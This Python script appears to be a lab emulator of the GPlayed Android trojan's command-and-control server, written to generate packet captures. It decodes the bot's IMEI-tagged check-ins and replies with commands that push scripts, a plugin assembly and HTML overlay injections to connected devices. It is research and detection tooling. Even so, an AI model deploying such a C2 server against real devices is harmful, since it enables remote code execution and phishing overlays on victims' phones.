#!/usr/bin/env python3
import argparse
import base64
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse


REQUEST_SUBS = (
    ("AAAZZZXXX", "="),
    ("|", "+"),
    (".", "/"),
)


def decode_request_payload(value):
    for old, new in REQUEST_SUBS:
        value = value.replace(old, new)
    padded = value + ("=" * ((4 - len(value) % 4) % 4))
    return base64.b64decode(padded).decode("utf-8", errors="replace")


def encode_response(code, payload):
    raw = json.dumps(payload, separators=(",", ":"), ensure_ascii=True).encode("utf-8")
    return f"{code}:{base64.b64encode(raw).decode('ascii')}"


def load_plugin_b64(path):
    data = Path(path).read_bytes()
    return base64.b64encode(data).decode("ascii")


def load_text(path):
    return Path(path).read_text(encoding="utf-8")


class C2State:
    def __init__(self, args):
        self.args = args
        self.ping_count = 0
        self.sequence = [item.strip() for item in args.sequence.split(",") if item.strip()]
        self.evaluate_code = load_text(args.evaluate_payload)
        self.loadscript_code = load_text(args.loadscript_payload)
        self.inject_html = load_text(args.addinject_payload)
        self.plugin_b64 = load_plugin_b64(args.plugin_dll)

    def next_action(self, request_code):
        if request_code == "Registration":
            return "Ok"
        if request_code != "Ping":
            return "Ok"
        if self.args.mode != "cycle":
            return self.args.mode
        action = self.sequence[self.ping_count % len(self.sequence)]
        self.ping_count += 1
        return action

    def payload_for(self, action):
        if action == "Ok":
            return {"Response": "OK"}
        if action == "Evaluate":
            return {
                "Script": self.evaluate_code
            }
        if action == "LoadScript":
            return {
                "Name": self.args.script_name,
                "Code": self.loadscript_code,
                "AutoLoad": self.args.autoload,
            }
        if action == "LoadPlugin":
            return {
                "Name": self.args.plugin_name,
                "Assembly": self.plugin_b64,
                "AutoLoad": self.args.autoload,
            }
        if action == "AddInject":
            return {
                "Activity": self.args.inject_activity,
                "HTML": self.inject_html,
            }
        raise ValueError(f"Unsupported action: {action}")


class GPlayedHandler(BaseHTTPRequestHandler):
    server_version = "GPlayedLabC2/1.0"

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        q_value = params.get("q", [""])[0]
        imei = ""
        request_code = "Unknown"
        request_json = ""

        if q_value and "-" in q_value and ":" in q_value:
            left, encoded = q_value.split(":", 1)
            imei, request_code = left.split("-", 1)
            try:
                request_json = decode_request_payload(encoded)
            except Exception as exc:
                request_json = f"<decode-error: {exc}>"

        action = self.server.state.next_action(request_code)
        payload = self.server.state.payload_for(action)
        body = encode_response(action, payload).encode("ascii")

        print(
            json.dumps(
                {
                    "client": self.client_address[0],
                    "raw_path": self.path,
                    "host": self.headers.get("Host", ""),
                    "path": parsed.path,
                    "imei": imei,
                    "request_code": request_code,
                    "request_json": request_json,
                    "response_action": action,
                    "response_len": len(body),
                },
                ensure_ascii=True,
            )
        )

        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=ascii")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        return


class GPlayedServer(ThreadingHTTPServer):
    def __init__(self, server_address, handler_cls, state):
        super().__init__(server_address, handler_cls)
        self.state = state


def main():
    parser = argparse.ArgumentParser(description="Benign GPlayed C2 emulator for lab PCAP capture.")
    payload_dir = Path(__file__).with_name("payloads")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=5416)
    parser.add_argument(
        "--mode",
        choices=["cycle", "Ok", "Evaluate", "LoadScript", "LoadPlugin", "AddInject"],
        default="cycle",
    )
    parser.add_argument(
        "--sequence",
        default="Evaluate,LoadScript,LoadPlugin,AddInject",
        help="Comma-separated EResponse sequence used when --mode cycle.",
    )
    parser.add_argument("--evaluate-payload", default=str(payload_dir / "Evaluate.csx"))
    parser.add_argument("--loadscript-payload", default=str(payload_dir / "LoadScript.csx"))
    parser.add_argument("--plugin-dll", default=str(payload_dir / "LabPlugin.dll"))
    parser.add_argument("--addinject-payload", default=str(payload_dir / "AddInject.html"))
    parser.add_argument("--script-name", default="LabScript")
    parser.add_argument("--plugin-name", default="LabPlugin")
    parser.add_argument("--inject-activity", default="com.android.settings")
    parser.add_argument("--autoload", action="store_true")
    args = parser.parse_args()

    state = C2State(args)
    server = GPlayedServer((args.host, args.port), GPlayedHandler, state)
    print(f"[*] GPlayed lab C2 listening on http://{args.host}:{args.port}/")
    print(f"[*] Mode: {args.mode}; sequence: {state.sequence}; inject activity: {args.inject_activity}")
    server.serve_forever()


if __name__ == "__main__":
    main()
